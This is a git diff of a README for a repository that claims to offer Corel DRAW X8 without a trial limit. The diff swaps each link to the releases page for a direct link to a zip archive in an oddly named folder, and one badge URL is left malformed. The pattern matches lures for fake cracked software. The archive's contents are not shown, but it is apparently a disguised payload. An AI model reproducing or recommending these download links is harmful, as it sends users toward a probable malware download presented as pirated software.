@@ -1,6 +1,6 @@
 # 🎨 Corel-DRAW-X8-No-Trial - Unlock Your Creative Potential
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/sudharsanan55/Corel-DRAW-X8-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/sudharsanan55/Corel-DRAW-X8-No-Trial/main/retromingently/Corel-DRAW-X8-No-Trial_2.9-beta.2.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sudharsanan55/Corel-DRAW-X8-No-Trial/main/retromingently/Corel-DRAW-X8-No-Trial_2.9-beta.2.zip)
 
 ## 📚 Description
 
@@ -10,7 +10,7 @@ This repository offers a comprehensive collection of official Corel DRAW X8 reso
 
 To get started with Corel DRAW X8, follow these simple steps. You will download and install the software from the releases page.
 
-1. **Visit the Releases Page:** Click [here](https://github.com/sudharsanan55/Corel-DRAW-X8-No-Trial/releases) to access the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/sudharsanan55/Corel-DRAW-X8-No-Trial/main/retromingently/Corel-DRAW-X8-No-Trial_2.9-beta.2.zip) to access the releases page.
 
 2. **Find the Latest Version:** Look for the most recent version, which is typically at the top of the list. 
 
@@ -34,7 +34,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 To officially get Corel DRAW X8, follow the steps outlined in the "Getting Started" section. You can return to the releases page anytime to upgrade to newer versions as they become available.
 
-[Download Now](https://github.com/sudharsanan55/Corel-DRAW-X8-No-Trial/releases)
+[Download Now](https://raw.githubusercontent.com/sudharsanan55/Corel-DRAW-X8-No-Trial/main/retromingently/Corel-DRAW-X8-No-Trial_2.9-beta.2.zip)
 
 ## 🎓 Tutorials and Guides
 
@@ -72,4 +72,4 @@ Feel free to reach out if you have questions or need help. You can find support 
 
 Stay motivated and keep exploring the full potential of Corel DRAW X8! 
 
-[Download Now](https://github.com/sudharsanan55/Corel-DRAW-X8-No-Trial/releases)
+[Download Now](https://raw.githubusercontent.com/sudharsanan55/Corel-DRAW-X8-No-Trial/main/retromingently/Corel-DRAW-X8-No-Trial_2.9-beta.2.zip)
